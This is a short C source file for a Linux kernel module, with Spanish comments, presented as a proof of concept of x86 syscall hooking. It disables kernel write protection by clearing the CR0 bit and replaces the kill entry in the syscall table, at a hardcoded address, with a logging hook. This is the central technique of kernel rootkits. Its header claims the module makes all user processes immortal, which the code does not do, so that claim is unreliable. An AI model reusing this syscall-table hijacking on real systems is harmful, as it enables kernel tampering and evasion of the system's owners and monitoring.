/*
	Author: NvK
	Thanks to: http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/
	Description: Makes all processes in ring3 immortal
*/
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/mm.h>
#include <linux/highmem.h>

#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/setup.h>
#include <asm/system.h>
#include <asm/pgtable.h>
#include <asm/pgalloc.h>

#define ELF_INITED 		".text.data"
#define ELF_BEGIN		".text.text"

static unsigned long kill_calls= 0;
// Puntero a la tabla
unsigned long *sys_call_table= (unsigned long*)0xc1562120;
// Función restaurada...
asmlinkage int (*original_kill)(pid_t, int);

int call_x86_hook_kill(pid_t pid, int sig)
{
	printk(KERN_ALERT "\n[+] x86 kill Hooked %ld", kill_calls++);
	return (*original_kill)(pid, sig);
}

static int __section(.init.text)__attribute__((cold)) notrace INIT_KERNEL(void)
{
	// desactivar bit de control
	native_write_cr0(native_read_cr0()&(~0x10000));
	
	original_kill= (void *)sys_call_table[__NR_kill];
	sys_call_table[__NR_kill]= call_x86_hook_kill;
	
	// activar bit de control(volver a su estado normal)
	native_write_cr0(native_read_cr0() | 0x10000);
  
  return 0;
}

static void __section(.exit.data) EXIT_KERNEL(void)
{
	native_write_cr0(native_read_cr0()&(~0x10000));
	sys_call_table[__NR_kill]= original_kill;
	native_write_cr0(native_read_cr0() | 0x10000);
	
	return;
}

module_init(INIT_KERNEL);
module_exit(EXIT_KERNEL);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nvk");
MODULE_DESCRIPTION("ring0 x86 hook - [kill poc]");
